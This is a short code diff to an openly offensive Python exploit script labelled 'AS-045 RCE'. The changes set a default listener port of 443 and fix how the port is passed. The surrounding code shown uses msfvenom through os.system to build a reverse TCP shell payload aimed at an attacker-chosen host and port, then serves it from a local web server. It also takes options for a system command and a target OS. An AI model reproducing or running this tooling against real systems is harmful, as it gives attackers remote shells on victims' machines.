@@ -41,7 +41,8 @@ class AS045:
 				print("\r\n[+] Initiating Omega Protocol [+]")
 
 			def venom(shell, ext):
-				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ self.lport + " -f "+ ext+ " > shelb")
+				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ str(self.lport) + " -f "+ ext+ " > shelb")
+
 			print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
 			print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
 			server_address = (self.lhost, int(self.wport))
@@ -109,7 +110,7 @@ def main():
 	parser.add_option("-c", "--command", dest="command", help="System Command, ")
 	parser.add_option("-o", "--os", dest="osys", help="Choose OS: Linux = 1, Windows = 2")
 	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
-	parser.add_option("-P", "--lport", dest="lport", help="LPORT")
+	parser.add_option("-P", "--lport", dest="lport",default=443 ,help="LPORT")
 	parser.add_option("-w", "--wport", dest="wport", default=4443, help="WPORT")
 	(options, args) = parser.parse_args() 
 	exploit = AS045(options) 
